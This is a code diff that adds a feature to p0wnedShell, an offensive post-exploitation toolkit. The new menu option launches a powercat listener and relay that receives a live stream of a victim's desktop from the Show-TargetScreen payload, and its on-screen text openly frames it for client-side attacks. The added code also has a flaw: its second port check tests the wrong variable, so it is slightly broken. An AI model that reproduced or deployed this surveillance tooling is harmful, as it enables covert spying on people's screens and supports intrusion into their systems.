@@ -24,7 +24,9 @@ namespace p0wnedShell
 			Console.WriteLine();
 			Console.WriteLine(" 3. Create a DNS tunnel to a remote DNSCat2 Server.");
 			Console.WriteLine();
-			Console.WriteLine(" 4. Back.");
+            Console.WriteLine(" 4. Create an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function.");
+            Console.WriteLine();
+            Console.WriteLine(" 5. Back.");
 			Console.Write("\nEnter choice: ");
 			
 			int userInput=0;			
@@ -33,7 +35,7 @@ namespace p0wnedShell
 				try 
 				{
 					userInput = Convert.ToInt32(Console.ReadLine());
-					if (userInput < 1 || userInput > 4) 
+					if (userInput < 1 || userInput > 5) 
 					{
 						Console.ForegroundColor = ConsoleColor.Red;
 						Console.WriteLine("\n[+] Wrong choice, please try again!\n");
@@ -65,7 +67,10 @@ namespace p0wnedShell
 				case 3:
 					PowerTunnel();
 				break;
-				default:
+                case 4:
+                    ShowScreen();
+                break;
+                default:
 				break;
 			}	
 		}
@@ -380,6 +385,93 @@ namespace p0wnedShell
 			}
 			return;
 		}
-		
-	}
+
+        public static void ShowScreen()
+        {
+            PowerBanner();
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("Creates an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function,");
+            Console.WriteLine("which can be used with Client Side Attacks. This code can stream a target's desktop in real time");
+            Console.WriteLine("and could be seen in browsers which support MJPEG (Firefox).\n");
+            Console.ResetColor();
+
+            int Lport = 0;
+            int Rport = 0;
+
+            while (true)
+            {
+                try
+                {
+                    Console.Write("Please Enter the listening port of your PowerCat Listener (e.g. 443): ");
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Lport = int.Parse(Console.ReadLine());
+                    Console.ResetColor();
+                    Console.WriteLine();
+
+                    if (Lport < 1 || Lport > 65535)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
+                        Console.ResetColor();
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+                catch
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
+                    Console.ResetColor();
+                }
+            }
+
+            while (true)
+            {
+                try
+                {
+                    Console.Write("Now Enter a local relay port to which Show-TargetScreen connects (e.g. 9000): ");
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Rport = int.Parse(Console.ReadLine());
+                    Console.ResetColor();
+                    Console.WriteLine();
+
+                    if (Lport < 1 || Lport > 65535)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
+                        Console.ResetColor();
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+                catch
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
+                    Console.ResetColor();
+                }
+            }
+
+            Console.WriteLine("[+] Please wait while setting up our Show-TargetScreen Listener/Relay...\n");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Now if we point Firefox to http://127.0.0.1:"+Rport+ " and run Show-TargetScreen on a victim,");
+            Console.WriteLine("we should have a live stream of the target user's Desktop.\n");
+            Console.ResetColor();
+
+            string ShowTargetScreen = "powercat -l -v -p " + Lport + " -r tcp:"+Rport+" -rep -t 1000";
+            try
+            {
+                P0wnedListener.Execute(ShowTargetScreen);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            return;
+        }
+    }
 }
